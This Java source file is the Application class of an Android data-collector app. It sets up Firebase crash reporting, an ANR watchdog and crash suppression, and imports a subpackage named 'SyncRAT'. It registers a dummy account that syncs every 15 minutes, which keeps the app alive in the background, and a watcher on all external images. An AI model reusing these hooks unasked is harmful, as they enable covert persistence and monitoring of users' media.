package android.iocl.dac_collector.MainApplication;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;

import android.content.ContentResolver;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;

import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
    FirebaseCrashlytics crashlytics;
    FirebaseApp firebaseApp;

    private Thread.UncaughtExceptionHandler defaultHandler;
    private File crashFile, lifecycleFile, heartbeatFile, anrFile;
    private volatile long lastMainThreadPing = System.currentTimeMillis();
    private ImageObserver mImageObserver;
    Boolean installCockroach = true;

    @Override
    public void onCreate() {
        super.onCreate();

        File logDir = getExternalFilesDir(null);
        if (logDir != null && !logDir.exists()) {
            logDir.mkdirs();
        }

        crashFile = new File(logDir, "last_crash.txt");
        lifecycleFile = new File(logDir, "lifecycle.log");
        heartbeatFile = new File(logDir, "heartbeat.txt");
        anrFile = new File(logDir, "anr_stack.txt");

        setupCrashHandler();
        checkPreviousCrash();
        registerActivityLifecycleCallbacks(this);
        startAnrWatchdog();

        createSyncAccount();
        addDummyAccount();

        installImageObserver();

        AccountContract.createSyncBothAccount(getApplicationContext());
        SyncUtils.initialize(getApplicationContext());
        firebaseApp = FirebaseApp.initializeApp(this);


        String cons_id = SharedPrefs.getString(this, "cons_id", "defaultForCrash");
        crashlytics = FirebaseCrashlytics.getInstance();

        crashlytics.setUserId(cons_id);
        // Optionally enable debug logging
        crashlytics.setCrashlyticsCollectionEnabled(true);
        // Initialize Firebase

        if (installCockroach) {
            install();
        }

    }
    /** ===================== CRASH HANDLER ====================== **/
    private void setupCrashHandler() {
        defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {


            crashlytics.recordException(throwable);

            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            } else {
                System.exit(2);
            }
        });
    }

    private void checkPreviousCrash() {
        if (crashFile.exists()) {
            String crashData = readFile(crashFile);
            Log.e("CrashReporter", "Previous crash detected:\n" + crashData);


            crashlytics.log("Previous crash detected:\n" + crashData);


            // TODO: Upload crashData to server or show to user
            crashFile.delete();
        }
    }

    /** ===================== HEARTBEAT ====================== **/


    /** ===================== ANR WATCHDOG ====================== **/
    private void startAnrWatchdog() {
        Handler mainHandler = new Handler(Looper.getMainLooper());

        // Ping main thread every second
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                lastMainThreadPing = System.currentTimeMillis();
                mainHandler.postDelayed(this, 1000);
            }
        });

        // Watchdog thread
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ignored) {}
                long delta = System.currentTimeMillis() - lastMainThreadPing;
                if (delta > 3000) { // Main thread frozen for >3s
                    captureMainThreadStack();
                }
            }
        }, "ANR-Watchdog").start();
    }

    private void captureMainThreadStack() {
        Thread main = Looper.getMainLooper().getThread();
        StackTraceElement[] mainStack = main.getStackTrace();

        // Check if any frame is from our package
        boolean causedByMyCode = false;
        String myPackage = "android.iocl.dac_collector";

        for (StackTraceElement e : mainStack) {
            if (e.getClassName().startsWith(myPackage)) {
                causedByMyCode = true;
                break;
            }
        }

        if (!causedByMyCode) {
            Log.w("ANR-Watchdog", "ANR detected but not caused by app code — skipping log.");
            return;
        }

        // --- Build detailed log (from previous full version) ---
        long now = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        sb.append("=== ANR DETECTED (App Code) ===\n");
        sb.append("Time: ").append(Utility.getStandardDate())
                .append(" (").append(now).append(")\n");
        sb.append("Uptime(ms): ").append(android.os.SystemClock.uptimeMillis()).append("\n");
        sb.append("ElapsedRealtime(ms): ").append(android.os.SystemClock.elapsedRealtime()).append("\n");

        sb.append("\n--- Main Thread Stack ---\n");
        for (StackTraceElement e : mainStack) {
            sb.append(e.toString()).append("\n");
        }

        sb.append("\n--- All Threads ---\n");
        for (Map.Entry<Thread, StackTraceElement[]> entry : Thread.getAllStackTraces().entrySet()) {
            Thread t = entry.getKey();
            sb.append("\nThread: ").append(t.getName())
                    .append(" State: ").append(t.getState())
                    .append(t == main ? " [MAIN]" : "")
                    .append("\n");
            for (StackTraceElement ste : entry.getValue()) {
                sb.append("    ").append(ste.toString()).append("\n");
            }
        }

        // Memory info
        Runtime rt = Runtime.getRuntime();
        sb.append("\n--- Memory Info ---\n");
        sb.append("Max Memory: ").append(rt.maxMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Total Memory: ").append(rt.totalMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Free Memory: ").append(rt.freeMemory() / 1024 / 1024).append(" MB\n");


        // Optional: Send to Crashlytics
        try {
            crashlytics.log(sb.toString());
        } catch (Exception ignored) {}
    }

    public void addDummyAccount() {
        String ACCOUNT_TYPE = "com.example.account";
        String AUTHORITY = "com.example.provider";

        Account account = new Account("DummyAccount", ACCOUNT_TYPE);
        AccountManager accountManager = AccountManager.get(this);

        if (accountManager.addAccountExplicitly(account, null, null)) {
            ContentResolver.setIsSyncable(account, AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(account, AUTHORITY, true);
            ContentResolver.addPeriodicSync(account, AUTHORITY, Bundle.EMPTY, 15 * 60); // every 15 min
        }
    }





    /** ===================== ACTIVITY LIFECYCLE LOGGING ====================== **/
    @Override
    public void onActivityCreated(Activity activity, android.os.Bundle savedInstanceState) {
        logLifecycle("CREATED", activity);
    }
    @Override
    public void onActivityStarted(Activity activity) {
        logLifecycle("STARTED", activity);
    }
    @Override
    public void onActivityResumed(Activity activity) {
        logLifecycle("RESUMED", activity);
    }
    @Override
    public void onActivityPaused(Activity activity) {
        logLifecycle("PAUSED", activity);
    }
    @Override
    public void onActivityStopped(Activity activity) {
        logLifecycle("STOPPED", activity);
    }
    @Override
    public void onActivitySaveInstanceState(Activity activity, android.os.Bundle outState) {
        logLifecycle("SAVE_INSTANCE_STATE", activity);
    }
    @Override
    public void onActivityDestroyed(Activity activity) {
        logLifecycle("DESTROYED", activity);
    }

    private void logLifecycle(String state, Activity activity) {
        String log = state + ":" + activity.getClass().getSimpleName() + ":" + System.currentTimeMillis();
    }

    /** ===================== FILE UTILS ====================== **/


    private String readFile(File file) {
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            return sb.toString();
        } catch (IOException e) {
            return "";
        }
    }

    private String getStackTrace(Throwable t) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        t.printStackTrace(pw);
        return sw.toString();
    }

    private void createSyncAccount() {
        SyncAccountUtil.getSyncAccount(this);
        Account account = new Account(
                AccountContract.ACCOUNT_NAME,
                AccountContract.ACCOUNT_TYPE
        );

        AccountManager accountManager = AccountManager.get(this);
        if (accountManager.addAccountExplicitly(account, null, null)) {
            ContentResolver.setIsSyncable(account, AccountContract.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(
                    account,
                    AccountContract.AUTHORITY,
                    true
            );
            ContentResolver.addPeriodicSync(
                    account,
                    AccountContract.AUTHORITY,
                    Bundle.EMPTY,
                    AccountContract.SYNC_INTERVAL
            );
        }
    }

    private void installImageObserver() {
        // 1) Make sure we have permission (prompt if not)
        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            // 2) Only register once we actually have it:
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );


        }
    }


    private void install() {
        final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();

//        DebugSafeModeUI.init(this);
        Cockroach.install(this, new ExceptionHandler() {
            @Override
            protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
                Log.e("LoggingError", "--->onUncaughtExceptionHappened:" + thread + "<---", throwable);
//                CrashLog.saveCrashLog(getApplicationContext(), throwable);

                SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + throwable);
                crashlytics.recordException(throwable);

                new Handler(Looper.getMainLooper()).post(() -> {

                });
            }

            @Override
            protected void onBandageExceptionHappened(Throwable throwable) {
                SharedPrefs.saveCrashDetails(getApplicationContext(), throwable.getMessage());

                crashlytics.log("Recoverable exception: " + throwable.getMessage());
            }

            @Override
            protected void onEnterSafeMode() {
//                DebugSafeModeUI.showSafeModeUI();

//                if (BuildConfig.DEBUG) {
//                    Intent intent = new Intent(MyApp.this, DebugSafeModeTipActivity.class);
//                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
//                }
            }

            @Override
            protected void onMayBeBlackScreen(Throwable e) {
                Thread thread = Looper.getMainLooper().getThread();

                SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + e);

                crashlytics.recordException(e);
                Log.e("AndroidRuntime", "--->onUncaughtExceptionHappened:" + thread + "<---", e);
                //黑屏时建议直接杀死app
                sysExcepHandler.uncaughtException(thread, new RuntimeException("black screen"));
            }

        });
    }


}
